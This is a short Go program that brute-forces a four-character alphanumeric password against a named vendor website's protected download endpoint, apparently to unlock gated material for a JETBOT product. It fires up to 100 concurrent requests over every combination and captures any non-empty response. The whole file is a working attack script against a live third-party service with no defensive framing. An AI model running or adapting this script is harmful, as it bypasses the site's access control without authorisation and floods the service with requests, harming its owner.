/*
 * @Date: 2021.03.25 12:48
 * @Description: Omit
 * @LastEditors: Rustle Karl
 * @LastEditTime: 2021.03.25 12:48
 */

package main

import (
	"fmt"
	"github.com/guonaihong/gout"
	"sync/atomic"
	"time"
)

var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
var url = "https://www.yahboom.com/jmima?pwd=%c%c%c%c&cname=JETBOT&material=339"
var result = make(chan string, 1)
var signal int64

func verify(url string) {
	for atomic.LoadInt64(&signal) > 100 {
		time.Sleep(3 * time.Second)
		continue
	}

	var response string

	atomic.AddInt64(&signal, 1)
	if err := gout.GET(url).BindBody(&response).Debug(false).Do(); err != nil {
		fmt.Println(err)
	}
	atomic.AddInt64(&signal, -1)

	if response != "" && response != "null" {
		result <- response
	}
}

func main() {
	//verify(fmt.Sprintf(url, 55, 55, 55, 55))

	for _, i := range chars {
		for _, j := range chars {
			for _, u := range chars {
				for _, v := range chars {
					for atomic.LoadInt64(&signal) > 100 {
						time.Sleep(3 * time.Second)
						continue
					}
					go verify(fmt.Sprintf(url, i, j, u, v))
				}
			}
		}
	}

	for {
		select {
		case <-result:
			fmt.Println(result)
			break
		}
	}
}
